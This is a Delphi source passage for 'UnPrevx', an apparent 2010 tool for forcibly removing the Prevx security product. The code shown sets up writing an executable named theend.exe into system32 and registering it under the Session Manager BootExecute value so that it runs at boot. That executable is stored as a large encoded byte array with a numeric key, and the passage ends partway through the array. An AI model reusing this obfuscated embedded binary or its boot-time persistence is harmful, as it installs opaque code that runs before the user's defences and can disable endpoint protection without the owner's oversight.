{$E exe}
{$IMAGEBASE $00400000}
{$R-}
{$Q-}
//{$DEFINE debug}
{$IFDEF minimum}
program UnPrevx;
{$ENDIF}
{$IFNDEF minimum}
unit UnPrevx;
interface
implementation
{$ENDIF}

{$R version.res}

uses
  Windows, RTL, CAcl, WinNative;

function SetEntriesInAclA(

  cCountOfExplicitEntries: ULONG; // number of entries in the list
  pListOfExplicitEntries: pointer; // pointer to list of entries with new access data
  OldAcl: PACL; // pointer to the original ACL
  NewAcl: PPOINTER // receives a pointer to the new ACL
  ): DWORD; stdcall; external advapi32;

const
  TheEndExe: PWideChar = '\system32\theend.exe';
  CurrentUser: PAnsiChar = 'CURRENT_USER';
  String1: PWideChar = 'Failed to get required privilege';
  Title: PWideChar = #20'UnPrevX 1.1.199 (20.08.2010, rebuild 15.09.2010)';
  MutantName: PWideChar = '\BaseNamedObjects\DoTheEnd';
  BootExecuteKey: PWideChar = '\REGISTRY\MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager';
  BootExecuteValue: PWideChar = 'BootExecute';
  ValueToSet: PWideChar = 'async theend';
  Key: ULONG = 150;

var
  Mutant: THANDLE;
  inbuf: array[0..8191] of WCHAR;
  outbuf: array[0..8191] of WCHAR;
  buf: LBuf;

  osver: OSVERSIONINFOEXW;
  str1: UNICODE_STRING;
  attr: OBJECT_ATTRIBUTES;

  data: array[0..4095] of byte = (
    $24, $32, $F7, $66, $66, $64, $63, $62, $65, $60, $5F, $5E, $8A, $89, $5B, $5A,
    $C1, $58, $57, $56, $55, $54, $53, $52, $11, $50, $4F, $4E, $4D, $4C, $4B, $4A,
    $49, $48, $47, $46, $45, $44, $43, $42, $41, $40, $3F, $3E, $3D, $3C, $3B, $3A,
    $39, $38, $37, $36, $35, $34, $33, $32, $31, $30, $2F, $2E, $7D, $2C, $2B, $2A,
    $27, $35, $91, $24, $25, $98, $1A, $5D, $00, $88, $1E, $DA, $58, $FB, $EF, $B2,
    $B0, $C9, $F7, $C6, $C7, $B1, $B8, $C4, $B0, $AB, $EF, $AF, $AC, $AA, $A9, $A7,
    $BD, $E8, $A9, $A9, $E5, $B6, $B6, $A0, $E1, $97, $9D, $DE, $C1, $B9, $CC, $DA,
    $94, $95, $9B, $99, $D3, $EF, $EE, $EC, $D5, $F0, $EF, $EE, $ED, $EC, $EB, $EA,
    $AE, $33, $62, $27, $E6, $50, $04, $72, $E2, $4C, $00, $6E, $DE, $48, $FC, $6A,
    $D3, $1C, $87, $66, $D5, $40, $F4, $62, $D2, $3C, $F1, $5E, $D6, $38, $EC, $5A,
    $65, $02, $83, $56, $C4, $30, $E4, $52, $5D, $FA, $6D, $4E, $BF, $28, $DC, $4A,
    $8B, $4F, $58, $4E, $B6, $20, $D4, $42, $B1, $B0, $AF, $AE, $AD, $AC, $AB, $AA,
    $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $A1, $A0, $9F, $9E, $9D, $9C, $9B, $9A,
    $69, $5B, $97, $96, $51, $93, $94, $92, $5D, $33, $2A, $4A, $8D, $8C, $8B, $8A,
    $89, $88, $87, $86, $A5, $84, $84, $81, $7A, $7F, $79, $7E, $7D, $82, $7B, $7A,
    $79, $70, $77, $76, $75, $74, $73, $72, $E9, $84, $6F, $6E, $6D, $7C, $6B, $6A,
    $69, $48, $67, $66, $65, $64, $23, $62, $61, $70, $5F, $5E, $5D, $5E, $5B, $5A,
    $5C, $58, $56, $56, $55, $54, $53, $52, $54, $50, $4E, $4E, $4D, $4C, $4B, $4A,
    $49, $08, $47, $46, $45, $48, $43, $42, $67, $1F, $3F, $3E, $3C, $3C, $3B, $3D,
    $39, $38, $47, $36, $35, $44, $33, $32, $31, $30, $3F, $2E, $2D, $3C, $2B, $2A,
    $29, $28, $27, $26, $35, $24, $23, $22, $21, $20, $1F, $1E, $1D, $1C, $1B, $1A,
    $ED, $F7, $17, $16, $ED, $14, $13, $12, $11, $10, $0F, $0E, $0D, $0C, $0B, $0A,
    $09, $08, $07, $06, $05, $04, $03, $02, $01, $00, $FF, $FE, $FD, $FC, $FB, $FA,
    $F9, $F8, $F7, $F6, $F5, $F4, $F3, $F2, $F1, $F0, $EF, $EE, $ED, $EC, $EB, $EA,
    $E9, $E8, $E7, $E6, $E5, $E4, $E3, $E2, $E1, $E0, $DF, $DE, $DD, $DC, $DB, $DA,
    $D9, $D8, $D7, $D6, $D5, $D4, $D3, $D2, $D1, $D0, $CF, $CE, $CD, $CC, $CB, $CA,
    $C9, $C8, $C7, $C6, $C5, $C4, $C3, $C2, $C1, $A0, $BF, $BE, $75, $BC, $BB, $BA,
    $B9, $B8, $B7, $B6, $B5, $B4, $B3, $B2, $B1, $B0, $AF, $AE, $AD, $AC, $AB, $AA,
    $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $7F, $54, $42, $46, $51, $9C, $9B, $9A,
    $4E, $9B, $97, $96, $95, $A4, $93, $92, $91, $96, $8F, $8E, $8D, $90, $8B, $8A,
    $89, $88, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E, $5D, $7C, $7B, $1A,
    $57, $2A, $1B, $15, $29, $13, $73, $72, $4D, $71, $6F, $6E, $6D, $4C, $6B, $6A,
    $69, $6C, $67, $66, $65, $5E, $63, $62, $61, $60, $5F, $5E, $5D, $5C, $5B, $5A,
    $59, $58, $57, $56, $15, $54, $53, $12, $2F, $F4, $EE, $02, $EC, $4C, $4B, $4A,
    $51, $4A, $47, $46, $45, $34, $43, $42, $41, $42, $3F, $3E, $3D, $3A, $3B, $3A,
    $39, $38, $37, $36, $35, $34, $33, $32, $31, $30, $2F, $2E, $ED, $2C, $2B, $6A,
    $29, $28, $27, $26, $25, $24, $23, $22, $21, $20, $1F, $1E, $1D, $1C, $1B, $1A,
    $19, $18, $17, $16, $15, $14, $13, $12, $11, $10, $0F, $0E, $0D, $0C, $0B, $0A,
    $09, $08, $07, $06, $05, $04, $03, $02, $01, $00, $FF, $FE, $FD, $FC, $FB, $FA,
    $F9, $F8, $F7, $F6, $F5, $F4, $F3, $F2, $F1, $F0, $EF, $EE, $ED, $EC, $EB, $EA,
    $E9, $E8, $E7, $E6, $E5, $E4, $E3, $E2, $E1, $E0, $DF, $DE, $DD, $DC, $DB, $DA,
    $D9, $D8, $D7, $D6, $D5, $D4, $D3, $D2, $D1, $D0, $CF, $CE, $CD, $CC, $CB, $CA,
    $C9, $C8, $C7, $C6, $C5, $C4, $C3, $C2, $C1, $C0, $BF, $BE, $BD, $BC, $BB, $BA,
    $B9, $B8, $B7, $B6, $B5, $B4, $B3, $B2, $B1, $B0, $AF, $AE, $AD, $AC, $AB, $AA,
    $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $A1, $A0, $9F, $9E, $9D, $9C, $9B, $9A,
    $99, $98, $97, $96, $95, $94, $93, $92, $91, $90, $8F, $8E, $8D, $8C, $8B, $8A,
    $89, $88, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E, $7D, $7C, $7B, $7A,
    $79, $78, $77, $76, $75, $74, $73, $72, $71, $70, $6F, $6E, $6D, $6C, $6B, $6A,
    $69, $68, $67, $66, $65, $64, $63, $62, $61, $60, $5F, $5E, $5D, $5C, $5B, $5A,
    $59, $58, $57, $56, $55, $54, $53, $52, $51, $50, $4F, $4E, $4D, $4C, $4B, $4A,
    $49, $48, $47, $46, $45, $44, $43, $42, $41, $40, $3F, $3E, $3D, $3C, $3B, $3A,
    $39, $38, $37, $36, $35, $34, $33, $32, $31, $30, $2F, $2E, $2D, $2C, $2B, $2A,
    $29, $28, $27, $26, $25, $24, $23, $22, $21, $20, $1F, $1E, $1D, $1C, $1B, $1A,
    $19, $18, $17, $16, $15, $14, $13, $12, $11, $10, $0F, $0E, $0D, $0C, $0B, $0A,
    $09, $08, $07, $06, $05, $04, $03, $02, $01, $00, $FF, $FE, $FD, $FC, $FB, $FA,
    $F9, $F8, $F7, $F6, $F5, $F4, $F3, $F2, $F1, $F0, $EF, $EE, $ED, $EC, $EB, $EA,
    $E9, $E8, $E7, $E6, $E5, $E4, $E3, $E2, $E1, $E0, $DF, $DE, $DD, $DC, $DB, $DA,
    $D9, $D8, $D7, $D6, $D5, $D4, $D3, $D2, $D1, $D0, $CF, $CE, $CD, $CC, $CB, $CA,
    $C9, $C8, $C7, $C6, $C5, $C4, $C3, $C2, $C1, $C0, $BF, $BE, $BD, $BC, $BB, $BA,
    $B9, $B8, $B7, $B6, $B5, $B4, $B3, $B2, $B1, $B0, $AF, $AE, $AD, $AC, $AB, $AA,
    $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $A1, $A0, $9F, $9E, $9D, $9C, $9B, $9A,
    $99, $98, $97, $96, $95, $94, $93, $92, $91, $90, $8F, $8E, $8D, $8C, $8B, $8A,
    $89, $88, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E, $7D, $7C, $7B, $7A,
    $79, $78, $77, $76, $75, $74, $73, $72, $71, $70, $6F, $6E, $6D, $6C, $6B, $6A,
    $3C, $E1, $83, $35, $34, $E5, $1E, $8E, $8E, $F7, $9F, $8E, $A5, $89, $88, $D1,
    $1C, $80, $D2, $19, $7D, $24, $ED, $52, $7E, $63, $3B, $2E, $0D, $4C, $82, $8B,
    $1C, $C1, $63, $C7, $61, $24, $19, $DA, $0D, $20, $FF, $3E, $B8, $FF, $63, $0A,
    $66, $4B, $0F, $16, $F5, $34, $24, $68, $AC, $F3, $57, $73, $F0, $4C, $33, $2A,
    $29, $28, $9E, $D9, $49, $69, $E6, $3E, $E1, $20, $1F, $1E, $94, $DF, $33, $91,
    $CC, $48, $8E, $C9, $49, $8F, $D6, $32, $E1, $A8, $0E, $0E, $1A, $0C, $A3, $1E,
    $FB, $C8, $07, $33, $18, $14, $E3, $C2, $01, $83, $3F, $A6, $E0, $29, $EE, $0E,
    $EB, $B8, $F7, $23, $08, $DC, $D3, $B2, $F1, $C6, $C5, $C4, $1A, $FF, $E3, $CA,
    $A9, $E8, $68, $2A, $E1, $7C, $01, $0F, $E1, $DC, $79, $0B, $0A, $EF, $BB, $BA,
    $99, $D8, $3F, $EE, $D6, $D4, $D3, $EA, $75, $FD, $FC, $FB, $E6, $41, $9E, $43,
    $E5, $47, $E3, $F2, $C7, $C4, $C3, $93, $97, $95, $38, $A9, $C1, $9C, $7B, $BA,
    $53, $BC, $20, $B6, $95, $B4, $B3, $83, $A2, $E6, $2A, $71, $E1, $7C, $81, $25,
    $6C, $D8, $77, $D3, $58, $B8, $E8, $65, $D5, $A0, $9F, $AE, $9D, $13, $4E, $C6,
    $10, $4B, $BF, $0D, $48, $C4, $C0, $E7, $7A, $D6, $8C, $0A, $AB, $8C, $8B, $8A,
    $02, $43, $B7, $FF, $48, $B8, $84, $C1, $FC, $10, $7F, $AE, $AA, $A9, $F2, $3D,
    $9D, $12, $7B, $79, $75, $94, $A0, $9F, $E8, $3B, $9B, $E5, $30, $94, $D4, $6A,
    $79, $68, $67, $37, $E0, $27, $8F, $32, $37, $DB, $22, $86, $2D, $89, $0E, $6E,
    $D0, $0B, $A3, $CD, $08, $74, $CA, $25, $69, $C7, $0A, $6A, $7A, $A1, $34, $90,
    $46, $C4, $9F, $46, $45, $44, $BE, $05, $91, $10, $D7, $42, $3C, $3C, $3B, $B5,
    $FC, $64, $07, $B1, $F8, $5C, $03, $5F, $E4, $44, $A6, $F9, $59, $59, $3E, $26,
    $09, $E8, $27, $0F, $6B, $21, $9F, $A3, $21, $20, $1F, $B8, $FD, $E4, $92, $9D,
    $A1, $43, $44, $43, $8C, $97, $9F, $3D, $3E, $3D, $86, $91, $49, $37, $38, $37,
    $82, $CB, $2B, $7D, $88, $3C, $2E, $2F, $2E, $79, $C2, $F6, $D3, $73, $7E, $66,
    $24, $25, $24, $71, $B8, $40, $C3, $6D, $74, $F4, $1A, $1B, $1A, $BC, $66, $AD,
    $3D, $B8, $14, $99, $F9, $5B, $56, $72, $0C, $0D, $0C, $B4, $75, $09, $08, $E7,
    $D9, $05, $8A, $D2, $1A, $57, $67, $FD, $FE, $FD, $B7, $CE, $CD, $CC, $10, $4D,
    $09, $F3, $F4, $F3, $CD, $C4, $C3, $C2, $06, $43, $03, $E9, $EA, $E9, $BB, $AA,
    $B9, $B8, $FC, $39, $B9, $DF, $E0, $DF, $B6, $B0, $AE, $AE, $DA, $BF, $B7, $8A,
    $69, $A8, $90, $EC, $51, $9C, $1C, $5D, $E9, $19, $72, $AE, $14, $96, $68, $68,
    $62, $CF, $D9, $A6, $95, $67, $0C, $AE, $12, $AC, $6F, $64, $BA, $3F, $83, $05,
    $4C, $B0, $57, $77, $BB, $B1, $96, $5A, $61, $40, $7F, $F9, $40, $A4, $F2, $3D,
    $91, $F3, $3A, $96, $45, $0E, $72, $ED, $34, $68, $3F, $B3, $30, $8C, $73, $6A,
    $69, $68, $DE, $19, $89, $A9, $26, $7E, $21, $60, $5F, $5E, $D4, $0F, $8B, $D1,
    $0C, $8C, $84, $69, $45, $34, $13, $52, $D4, $90, $F7, $48, $7A, $FF, $43, $10,
    $76, $5B, $2F, $26, $05, $44, $BC, $88, $0F, $77, $81, $42, $3D, $0F, $B4, $56,
    $08, $B9, $DA, $62, $35, $CE, $37, $CA, $31, $40, $3F, $2E, $A8, $EF, $23, $FA,
    $C3, $28, $A2, $E9, $51, $F4, $BD, $4F, $4E, $33, $23, $FE, $DD, $1C, $94, $DD,
    $45, $4F, $59, $1A, $15, $E7, $8C, $2E, $E0, $91, $B2, $3A, $0D, $A4, $0B, $8A,
    $09, $08, $82, $C9, $31, $D4, $7E, $C5, $F9, $D0, $99, $2B, $2A, $0F, $FB, $DA,
    $B9, $F8, $2E, $38, $F9, $F4, $C9, $C7, $5F, $F0, $FF, $EE, $ED, $C2, $03, $44,
    $16, $15, $14, $5F, $0D, $67, $10, $96, $D0, $7A, $DF, $B4, $B2, $76, $DE, $07,
    $EC, $BC, $B7, $96, $D5, $BF, $D7, $D2, $D1, $10, $82, $C8, $A2, $E4, $3C, $F7,
    $F6, $F5, $C8, $FC, $DE, $19, $46, $02, $69, $BA, $42, $07, $71, $BE, $32, $AB,
    $32, $FD, $D0, $AE, $8A, $CC, $3C, $DF, $DE, $DD, $A0, $EE, $7A, $7A, $EC, $7D,
    $22, $C4, $28, $C2, $81, $3C, $37, $82, $61, $A0, $1A, $61, $D1, $6C, $C8, $AD,
    $71, $78, $57, $96, $86, $D4, $63, $62, $61, $2A, $8E, $5E, $5D, $5C, $02, $4D,
    $D1, $FF, $4A, $A6, $FC, $47, $A7, $F9, $44, $98, $FA, $41, $99, $4C, $F6, $3D,
    $CD, $48, $0F, $76, $75, $74, $B3, $ED, $34, $9C, $EA, $29, $A1, $3C, $B0, $2D,
    $BD, $70, $67, $66, $65, $DB, $1E, $AE, $8E, $73, $53, $3E, $1D, $5C, $D4, $1D,
    $85, $8F, $98, $29, $CE, $70, $D4, $6E, $61, $41, $8F, $1E, $1D, $E6, $43, $C5,
    $04, $70, $16, $DE, $45, $44, $42, $42, $BC, $FB, $6F, $0D, $0D, $0C, $0B, $67,
    $2C, $48, $29, $F6, $35, $79, $F6, $5A, $75, $27, $2F, $2E, $72, $EF, $57, $24,
    $29, $28, $27, $53, $38, $38, $03, $E2, $21, $57, $60, $F1, $96, $38, $9C, $36,
    $F1, $E9, $ED, $EB, $90, $DF, $3B, $2A, $1B, $3D, $3C, $3B, $86, $3C, $FC, $37,
    $F2, $3D, $BB, $B8, $7E, $C2, $EF, $EB, $3E, $B4, $C8, $16, $3E, $FB, $FB, $FA,
    $7C, $38, $AA, $C8, $6E, $BA, $B7, $69, $B4, $20, $6A, $B1, $1D, $BC, $66, $AD,
    $31, $B8, $7F, $13, $12, $F1, $E3, $5D, $A4, $0C, $AF, $55, $88, $10, $20, $9D,
    $21, $E0, $D7, $D6, $D5, $4B, $7E, $1E, $48, $7B, $F3, $45, $78, $EC, $42, $75,
    $E1, $3F, $72, $E2, $F2, $D7, $83, $A2, $81, $C0, $42, $FE, $65, $CD, $90, $E7,
    $6C, $E4, $E4, $C9, $95, $94, $73, $B2, $DE, $63, $DB, $DB, $C0, $94, $8B, $6A,
    $A9, $C0, $62, $D3, $D2, $D1, $1C, $A8, $8A, $E5, $53, $A2, $9E, $CC, $B4, $2E,
    $6F, $B0, $44, $C4, $C2, $C1, $60, $60, $5A, $C7, $D0, $61, $06, $A8, $0C, $A6,
    $75, $5E, $1F, $BE, $65, $44, $83, $FD, $44, $CC, $4F, $AB, $90, $54, $5B, $3A,
    $79, $69, $AD, $4C, $4B, $0E, $13, $0C, $74, $46, $07, $EE, $6D, $6C, $6B, $E5,
    $2C, $B4, $DE, $29, $A1, $3A, $DE, $25, $85, $30, $DA, $21, $A1, $2C, $F3, $5B,
    $59, $68, $57, $D1, $18, $80, $23, $97, $14, $94, $57, $4E, $4D, $4C, $C2, $FD,
    $81, $8D, $0A, $96, $05, $44, $43, $42, $B8, $F3, $93, $B5, $F0, $84, $68, $4D,
    $2D, $18, $F7, $36, $B8, $74, $DB, $ED, $07, $06, $C7, $26, $2F, $2C, $2B, $C2,
    $21, $18, $E7, $26, $A0, $E7, $47, $F2, $F7, $F6, $F5, $4B, $D0, $48, $48, $2D,
    $21, $F8, $D7, $16, $98, $54, $BB, $ED, $AB, $0F, $A9, $0D, $E3, $87, $CE, $3E,
    $D9, $83, $CA, $22, $D5, $7F, $C6, $26, $D1, $D6, $D5, $D4, $2A, $AF, $27, $71,
    $AC, $28, $6E, $A9, $11, $6B, $A6, $1A, $36, $B3, $23, $E6, $EF, $EC, $EB, $17,
    $FC, $C4, $C7, $A6, $E5, $B2, $1A, $23, $B4, $59, $FB, $5F, $F9, $D8, $73, $E2,
    $B8, $98, $D7, $EE, $C0, $FF, $00, $FF, $54, $10, $83, $6B, $E5, $B6, $F8, $F7,
    $F6, $E0, $CE, $F4, $F2, $F1, $24, $D2, $B3, $80, $BF, $58, $EA, $37, $7E, $E6,
    $89, $33, $7A, $EA, $85, $4C, $93, $C2, $71, $B0, $C7, $FB, $D6, $D9, $D8, $21,
    $6C, $D0, $28, $51, $CD, $A4, $4F, $99, $CE, $53, $D3, $CB, $B0, $84, $7B, $5A,
    $99, $32, $97, $30, $95, $2E, $92, $BF, $A4, $88, $6F, $4E, $8D, $0D, $CF, $86,
    $7A, $C8, $47, $3A, $94, $EC, $9B, $83, $81, $80, $97, $8D, $A6, $A9, $A8, $92,
    $4E, $A6, $A4, $A3, $8E, $8E, $F4, $5D, $81, $62, $2F, $6E, $6D, $20, $67, $97,
    $5C, $78, $59, $26, $65, $91, $76, $4A, $41, $20, $5F, $F8, $5D, $F6, $88, $87,
    $6C, $38, $37, $16, $55, $81, $36, $52, $41, $10, $4F, $85, $8F, $50, $4B, $F0,
    $C2, $87, $ED, $C7, $6D, $E3, $EF, $3C, $E7, $C1, $67, $E8, $EA, $40, $E1, $BB,
    $59, $85, $78, $0C, $0A, $9C, $A3, $12, $F1, $30, $A8, $55, $A6, $7C, $04, $52,
    $CF, $A1, $23, $3B, $3D, $7A, $50, $4F, $4E, $C6, $98, $18, $1A, $91, $4B, $32,
    $52, $45, $44, $43, $12, $89, $53, $B8, $FA, $40, $C4, $1D, $BF, $20, $04, $50,
    $8A, $4A, $09, $AC, $88, $44, $B6, $4A, $F2, $40, $CC, $CC, $3E, $ED, $3B, $BA,
    $12, $20, $78, $2E, $22, $0D, $24, $F2, $F1, $F0, $EF, $EE, $ED, $EC, $EB, $EA,
    $E9, $E8, $E7, $E6, $E5, $E4, $E3, $E2, $E1, $E0, $DF, $DE, $DD, $DC, $DB, $DA,
    $D9, $D8, $D7, $D6, $D5, $D4, $D3, $D2, $D1, $D0, $CF, $CE, $CD, $CC, $CB, $CA,
    $C9, $C8, $C7, $C6, $C5, $C4, $C3, $C2, $C1, $C0, $BF, $BE, $BD, $BC, $BB, $BA,
    $B9, $B8, $B7, $B6, $B5, $B4, $B3, $B2, $B1, $B0, $AF, $AE, $AD, $AC, $AB, $AA,
    $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $A1, $A0, $9F, $9E, $9D, $9C, $9B, $9A,
    $99, $98, $97, $96, $95, $94, $93, $92, $91, $90, $8F, $8E, $8D, $8C, $8B, $8A,
    $89, $88, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E, $7D, $7C, $7B, $7A,
    $79, $78, $77, $76, $75, $74, $73, $72, $71, $70, $6F, $6E, $6D, $6C, $6B, $6A,
    $AD, $47, $67, $66, $AF, $43, $63, $62, $95, $3F, $5F, $5E, $5B, $3E, $5B, $5A,
    $31, $3A, $57, $56, $3D, $36, $53, $52, $21, $32, $4F, $4E, $1B, $2E, $4B, $4A,
    $F9, $2A, $47, $46, $CB, $26, $43, $42, $A3, $22, $3F, $3E, $A7, $1E, $3B, $3A,
    $71, $1A, $37, $36, $59, $16, $33, $32, $65, $12, $2F, $2E, $5B, $0E, $2B, $2A,
    $3B, $09, $27, $26, $25, $24, $23, $22, $D9, $C3, $BB, $BA, $BA, $FC, $DF, $B9,
    $B7, $AF, $BA, $B2, $F5, $F2, $BF, $F0, $11, $10, $0F, $0E, $D9, $0C, $CD, $0A,
    $A8, $08, $B8, $06, $A8, $04, $C1, $02, $A0, $00, $9A, $FE, $A0, $FC, $9F, $FA,
    $B6, $F8, $99, $F6, $8F, $F4, $96, $F2, $92, $F0, $A3, $EE, $9E, $EC, $B7, $EA,
    $AD, $E8, $84, $E6, $B9, $E4, $7B, $E2, $84, $E0, $A2, $DE, $7B, $DC, $7F, $DA,
    $D9, $D8, $D7, $D6, $A1, $D4, $97, $D2, $74, $D0, $85, $CE, $64, $CC, $6C, $CA,
    $6C, $C8, $93, $C6, $87, $C4, $66, $C2, $64, $C0, $6F, $BE, $BD, $BC, $BB, $BA,
    $69, $B8, $69, $B6, $58, $B4, $69, $B2, $59, $B0, $8D, $AE, $50, $AC, $53, $AA,
    $4C, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $6D, $A0, $70, $9E, $44, $9C, $4C, $9A,
    $4D, $98, $3A, $96, $30, $94, $65, $92, $2E, $90, $2C, $8E, $41, $8C, $57, $8A,
    $3A, $88, $2E, $86, $36, $84, $37, $82, $24, $80, $1A, $7E, $6E, $7C, $6D, $7A,
    $45, $78, $1B, $76, $27, $74, $0A, $72, $27, $70, $12, $6E, $1F, $6C, $1C, $6A,
    $35, $68, $17, $66, $0D, $64, $15, $62, $15, $60, $10, $5E, $3B, $5C, $0C, $5A,
    $00, $58, $08, $56, $55, $54, $53, $52, $1D, $50, $3C, $4E, $3A, $4C, $17, $4A,
    $F9, $48, $EF, $46, $F6, $44, $E4, $42, $E0, $40, $DD, $3E, $3D, $3C, $3B, $3A,
    $29, $38, $26, $36, $27, $34, $24, $32, $25, $30, $22, $2E, $23, $2C, $20, $2A,
    $11, $28, $0E, $26, $E4, $24, $E5, $22, $E2, $20, $E3, $1E, $E0, $1C, $E1, $1A,
    $19, $18, $17, $16, $C1, $F3, $13, $12, $11, $10, $0F, $0E, $0D, $0C, $0B, $0A,
    $EB, $E9, $07, $06, $05, $E4, $03, $02, $01, $00, $FF, $FE, $FD, $FC, $FB, $FA,
    $F9, $F8, $F7, $F6, $F5, $F4, $F3, $F2, $F1, $F0, $EF, $EE, $31, $CB, $EB, $EA,
    $33, $C7, $E7, $E6, $19, $C3, $E3, $E2, $DF, $C2, $DF, $DE, $B5, $BE, $DB, $DA,
    $C1, $BA, $D7, $D6, $A5, $B6, $D3, $D2, $9F, $B2, $CF, $CE, $7D, $AE, $CB, $CA,
    $4F, $AA, $C7, $C6, $27, $A6, $C3, $C2, $2B, $A2, $BF, $BE, $F5, $9E, $BB, $BA,
    $DD, $9A, $B7, $B6, $E9, $96, $B3, $B2, $DF, $92, $AF, $AE, $BF, $8D, $AB, $AA,
    $A9, $A8, $A7, $A6, $2B, $A4, $61, $56, $67, $52, $42, $41, $73, $33, $4D, $4E,
    $4C, $37, $33, $51, $38, $2F, $30, $44, $38, $90, $50, $8E, $4B, $40, $4A, $26,
    $25, $25, $28, $25, $39, $27, $59, $19, $33, $34, $32, $1D, $19, $37, $1E, $15,
    $16, $2A, $1E, $76, $B2, $76, $45, $26, $0D, $41, $12, $22, $3D, $1E, $08, $0B,
    $0C, $19, $18, $1D, $16, $25, $15, $F9, $15, $F7, $00, $FD, $F9, $5C, $9D, $5A,
    $17, $0C, $27, $08, $F2, $08, $F6, $F3, $05, $26, $E6, $00, $01, $FF, $EA, $E6,
    $04, $EB, $E2, $E3, $F7, $EB, $43, $42, $B0, $40, $FD, $F2, $FA, $EC, $DE, $D8,
    $F4, $EB, $EB, $D5, $D3, $E8, $33, $32, $E5, $30, $ED, $E2, $F1, $CF, $E1, $C1,
    $CA, $CB, $DE, $C3, $E6, $C1, $C1, $D6, $D3, $BD, $BB, $E4, $B4, $B8, $BE, $1A,
    $E9, $17, $D5, $CA, $EA, $C6, $AA, $C6, $B4, $D6, $A6, $AA, $B0, $0C, $A3, $0A,
    $C7, $BC, $C8, $B8, $A8, $A3, $B7, $A5, $D5, $98, $B1, $A1, $9C, $A0, $FB, $FA,
    $E6, $F7, $B5, $AA, $C9, $97, $A5, $8D, $88, $8E, $8E, $A2, $90, $BC, $9D, $87,
    $8A, $8B, $98, $97, $E5, $E4, $FA, $E2, $9F, $94, $AE, $91, $80, $8E, $82, $AB,
    $80, $89, $8B, $79, $70, $8B, $71, $78, $6E, $82, $6A, $6D, $81, $63, $68, $68,
    $C9, $C8, $BA, $C8, $97, $78, $5F, $79, $5F, $57, $73, $91, $5B, $53, $5C, $57,
    $5D, $5B, $88, $6A, $67, $4B, $51, $57, $B1, $B0, $39, $AE, $6B, $60, $67, $47,
    $4A, $41, $6D, $3D, $41, $47, $A3, $A2, $09, $A0, $5D, $52, $5A, $4C, $3E, $38,
    $6A, $3F, $32, $38, $32, $30, $2A, $33, $4D, $27, $2D, $27, $4A, $2E, $25, $2D,
    $2A, $3C, $87, $86, $5A, $84, $41, $36, $42, $32, $22, $1D, $31, $1F, $41, $11,
    $15, $1B, $77, $76, $2E, $74, $31, $26, $32, $0C, $0C, $1F, $10, $6C, $07, $6A,
    $27, $1C, $2B, $09, $01, $03, $0A, $25, $09, $03, $00, $11, $11, $F3, $F8, $F8,
    $59, $58, $C8, $56, $13, $08, $10, $02, $F4, $EE, $1F, $00, $EA, $ED, $EE, $FB,
    $FA, $48, $E5, $FA, $E9, $E0, $DF, $20, $E5, $DC, $DB, $3E, $3D, $3C, $3B, $3A,
    $39, $38, $37, $36, $35, $34, $33, $32, $31, $30, $2F, $2E, $2D, $2C, $2B, $2A,
    $29, $28, $27, $26, $25, $24, $23, $22, $21, $20, $1F, $1E, $1D, $1C, $1B, $1A,
    $19, $18, $17, $16, $15, $14, $13, $12, $11, $10, $0F, $0E, $0D, $0C, $0B, $0A,
    $09, $08, $07, $06, $05, $04, $03, $02, $01, $00, $FF, $FE, $FD, $FC, $FB, $FA,
    $F9, $F8, $F7, $F6, $F5, $F4, $F3, $F2, $F1, $F0, $EF, $EE, $ED, $EC, $EB, $EA,
    $E9, $E8, $E7, $E6, $E5, $E4, $E3, $E2, $E1, $E0, $DF, $DE, $DD, $DC, $DB, $DA,
    $D9, $D8, $D7, $D6, $D5, $D4, $D3, $D2, $D1, $D0, $CF, $CE, $CD, $CC, $CB, $CA,
    $C9, $C8, $C7, $C6, $C5, $C4, $C3, $C2, $C1, $C0, $BF, $BE, $BD, $BC, $BB, $BA,
    $B9, $B8, $B7, $B6, $B5, $B4, $B3, $B2, $B1, $B0, $AF, $AE, $AD, $AC, $AB, $AA,
    $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $A1, $A0, $9F, $9E, $9D, $9C, $9B, $9A,
    $99, $98, $97, $96, $95, $94, $93, $92, $91, $90, $8F, $8E, $8D, $8C, $8B, $8A,
    $89, $88, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E, $7D, $7C, $7B, $7A,
    $79, $78, $77, $76, $75, $74, $73, $72, $71, $70, $6F, $6E, $6D, $6C, $6B, $6A,
    $21, $48, $27, $66, $65, $64, $63, $62, $61, $60, $5F, $5E, $5D, $5C, $5B, $5A,
    $59, $58, $57, $56, $55, $54, $53, $52, $51, $50, $4F, $4E, $4D, $4C, $4B, $4A,
    $49, $48, $47, $46, $45, $44, $43, $42, $41, $40, $3F, $3E, $3D, $3C, $3B, $3A,
    $39, $38, $37, $36, $35, $34, $33, $32, $31, $30, $2F, $2E, $2D, $2C, $2B, $2A,
    $29, $28, $27, $26, $25, $24, $23, $22, $21, $20, $1F, $1E, $1D, $1C, $1B, $1A,
    $19, $18, $17, $16, $15, $14, $13, $12, $11, $10, $0F, $0E, $0D, $0C, $0B, $0A,
    $09, $08, $07, $06, $05, $04, $03, $02, $01, $00, $FF, $FE, $FD, $FC, $FB, $FA,
    $F9, $F8, $F7, $F6, $F5, $F4, $F3, $F2, $F1, $F0, $EF, $EE, $ED, $EC, $EB, $EA,
    $E9, $E8, $E7, $E6, $E5, $E4, $E3, $E2, $E1, $E0, $DF, $DE, $DD, $DC, $DB, $DA,
    $D9, $D8, $D7, $D6, $D5, $D4, $D3, $D2, $D1, $D0, $CF, $CE, $CD, $CC, $CB, $CA,
    $C9, $C8, $C7, $C6, $C5, $C4, $C3, $C2, $C1, $C0, $BF, $BE, $BD, $BC, $BB, $BA,
    $B9, $B8, $B7, $B6, $B5, $B4, $B3, $B2, $B1, $B0, $AF, $AE, $AD, $AC, $AB, $AA,
    $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $A1, $A0, $9F, $9E, $9D, $9C, $9B, $9A,
    $99, $98, $97, $96, $95, $94, $93, $92, $91, $90, $8F, $8E, $8D, $8C, $8B, $8A,
